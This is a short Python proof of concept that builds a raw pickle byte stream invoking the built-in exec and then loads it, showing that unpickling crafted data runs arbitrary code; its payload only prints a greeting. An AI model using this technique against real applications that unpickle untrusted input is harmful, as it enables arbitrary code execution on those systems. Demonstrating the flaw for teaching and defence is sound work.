import pickle

EVIL_STUFF = """
def evil_function():
    print("Salve mundus!")

evil_function()
"""

PICKLE_NEWLINE = "\\u000a"


def main() -> None:
    normalised_evil_stuff = EVIL_STUFF.replace('\n', PICKLE_NEWLINE)
    malicious_string = f"c__builtin__\nexec\n(V{normalised_evil_stuff}\ntR."
    malicious_bytes = malicious_string.encode()
    pickle.loads(malicious_bytes)


if __name__ == "__main__":
    main()
